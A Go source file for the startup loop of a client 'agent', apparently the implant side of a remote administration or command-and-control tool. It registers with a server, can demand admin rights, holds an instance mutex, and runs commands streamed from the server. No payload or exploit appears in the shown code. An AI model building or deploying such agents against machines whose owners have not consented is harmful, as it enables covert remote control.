package agent

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

// Run boots and manages the lifecycle of the agent. It blocks until the
// provided context is cancelled or a fatal error occurs.
func Run(ctx context.Context, opts RuntimeOptions) error {
	opts.ensureDefaults()
	if err := opts.Validate(); err != nil {
		return err
	}

	normalizedServerURL, err := canonicalizeServerURL(opts.ServerURL)
	if err != nil {
		return err
	}
	opts.ServerURL = normalizedServerURL

	if err := enforcePrivilegeRequirement(opts.Preferences.ForceAdmin); err != nil {
		return err
	}

	mutexGuard, err := acquireInstanceMutex(opts.Preferences.MutexKey)
	if err != nil {
		return fmt.Errorf("failed to honor mutex preference: %w", err)
	}
	if mutexGuard != nil {
		defer mutexGuard.Release()
		description := "instance mutex guard"
		if name := mutexGuard.Name(); name != "" {
			description = fmt.Sprintf("instance mutex: %s", name)
		}
		if mutexGuard.Recovered() {
			opts.Logger.Printf("recovered stale %s", description)
		} else {
			opts.Logger.Printf("acquired %s", description)
		}
	}

	metadata := opts.Metadata
	if strings.TrimSpace(metadata.Hostname) == "" {
		metadata = CollectMetadataWithClient(opts.BuildVersion, opts.HTTPClient)
	}

	client := opts.HTTPClient

	registration, err := registerAgentWithRetry(ctx, opts.Logger, client, opts.ServerURL, opts.SharedSecret, metadata, opts.maxBackoffOverride())
	if err != nil {
		return fmt.Errorf("failed to register agent: %w", err)
	}

	agent := &Agent{
		id:             registration.AgentID,
		key:            registration.AgentKey,
		baseURL:        opts.ServerURL,
		client:         client,
		config:         registration.Config,
		logger:         opts.Logger,
		pendingResults: make([]protocol.CommandResult, 0, 8),
		startTime:      time.Now(),
		metadata:       metadata,
		sharedSecret:   opts.SharedSecret,
		preferences:    opts.Preferences,
		buildVersion:   opts.BuildVersion,
		timing:         opts.TimingOverride,
	}

	modules := newDefaultModuleRegistry()
	if err := modules.Update(agent.moduleRuntime()); err != nil {
		return fmt.Errorf("initialize modules: %w", err)
	}
	agent.modules = modules

	router, err := newDefaultCommandRouter()
	if err != nil {
		return fmt.Errorf("initialize commands: %w", err)
	}
	agent.commands = router

	if notesPath, err := notes.DefaultPath(); err != nil {
		opts.Logger.Printf("notes disabled (path error): %v", err)
	} else {
		sharedMaterial := opts.SharedSecret
		if strings.TrimSpace(sharedMaterial) == "" {
			sharedMaterial = registration.AgentKey + "-shared"
		}
		if notesManager, err := notes.NewManager(notesPath, registration.AgentKey, sharedMaterial); err != nil {
			opts.Logger.Printf("notes disabled (init failed): %v", err)
		} else {
			agent.notes = notesManager
		}
	}

	agent.applyPreferences()

	opts.Logger.Printf("registered as %s", agent.id)
	agent.processCommands(ctx, registration.Commands)

	go agent.runCommandStream(ctx)
	go agent.run(ctx)

	<-ctx.Done()
	opts.Logger.Println("shutting down")

	shutdownCtx, cancel := context.WithTimeout(context.Background(), opts.ShutdownGrace)
	defer cancel()
	agent.shutdown(shutdownCtx)

	return nil
}

func (o RuntimeOptions) maxBackoffOverride() time.Duration {
	if o.TimingOverride.MaxBackoff > 0 {
		return o.TimingOverride.MaxBackoff
	}
	return 0
}

func canonicalizeServerURL(raw string) (string, error) {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return "", fmt.Errorf("server url must be provided")
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return "", fmt.Errorf("invalid server url: %w", err)
	}

	if parsed.Scheme == "" || parsed.Host == "" {
		return "", fmt.Errorf("invalid server url: %s", trimmed)
	}

	host := parsed.Hostname()
	port := parsed.Port()

	if strings.EqualFold(host, "localhost") {
		host = "127.0.0.1"
	}

	if port != "" {
		parsed.Host = net.JoinHostPort(host, port)
	} else {
		parsed.Host = host
	}

	return parsed.String(), nil
}
